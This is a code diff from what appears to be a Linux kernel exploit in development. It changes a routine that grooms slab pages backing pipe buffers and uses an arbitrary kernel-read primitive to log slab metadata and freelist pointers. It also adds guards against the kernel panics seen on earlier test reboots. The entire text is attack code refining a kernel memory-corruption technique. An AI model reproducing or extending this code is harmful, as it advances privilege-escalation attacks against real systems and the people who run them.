@@ -513,8 +513,8 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     unsigned pre_inuse = (unsigned)(pre_meta & 0xffffu);
     unsigned pre_objs = (unsigned)((pre_meta >> 16) & 0x7fffu);
     int pre_frozen = (int)((pre_meta >> 31) & 1u);
-    pr_info("pipe pre-sweep meta inuse=%u objects=%u frozen=%d\n",
-            pre_inuse, pre_objs, pre_frozen);
+    pr_info("pipe pre-sweep meta head=%016zx inuse=%u objects=%u frozen=%d\n",
+            pre_head, pre_inuse, pre_objs, pre_frozen);
     if (pre_inuse >= pre_objs && pre_frozen == 0) {
       pr_warning("pipe prepare: target page full (%u/%u, foreign holders); "
                  "abort before waves\n", pre_inuse, pre_objs);
@@ -600,10 +600,21 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
         {
           uint64_t t2 = read_target_slab_cache(conv_fd, base);
           uintptr_t hd = direct_to_head_page(conv_fd, base);
-          uint64_t mt = kernel_read64(conv_fd, hd + 0x28);
-          pr_info("pipe post-kill rcu wait w=%d tsc=%016llx inuse=%u "
-                  "frozen=%d\n", w, (unsigned long long)t2,
-                  (unsigned)(mt & 0xffffu), (int)((mt >> 31) & 1u));
+          /* hd==0 guard: if the RCU wait actually caught the discard the
+           * page is no longer a slab -- reading hd+0x28 then derefs
+           * 0x28 in the kernel (panic, not benign failure). */
+          if (hd) {
+            uint64_t mt = kernel_read64(conv_fd, hd + 0x28);
+            uint64_t fr = kernel_read64(conv_fd, hd + 0x08);
+            pr_info("pipe post-kill rcu wait w=%d head=%016zx tsc=%016llx "
+                    "inuse=%u frozen=%d freelist=%016llx\n", w, hd,
+                    (unsigned long long)t2,
+                    (unsigned)(mt & 0xffffu), (int)((mt >> 31) & 1u),
+                    (unsigned long long)fr);
+          } else {
+            pr_info("pipe post-kill rcu wait w=%d tsc=%016llx head=0 "
+                    "(page left slab)\n", w, (unsigned long long)t2);
+          }
         }
       }
     } else if (sc2 != tsc) {
@@ -653,11 +664,12 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     uintptr_t head = direct_to_head_page(conv_fd, base);
     uint64_t wflags = kernel_read64(conv_fd, head + 0);
     uint64_t wmeta = kernel_read64(conv_fd, head + 0x28);
+    uint64_t wfree = kernel_read64(conv_fd, head + 0x08);
     pr_info("phys wave stuck head=%016zx flags=%016llx meta=%016llx "
-            "inuse=%u objects=%u frozen=%d\n",
+            "inuse=%u objects=%u frozen=%d freelist=%016llx\n",
             head, (unsigned long long)wflags, (unsigned long long)wmeta,
             (unsigned)(wmeta & 0xffffu), (unsigned)((wmeta >> 16) & 0x7fffu),
-            (int)((wmeta >> 31) & 1u));
+            (int)((wmeta >> 31) & 1u), (unsigned long long)wfree);
     /* owner-forensics REMOVED (reboots 7 and 10, e5d016e6/934a736c): a
      * cfgfs kernel read of a garbage owner dereferences an unmapped
      * linear-map hole and oopses -- even with a range check, the
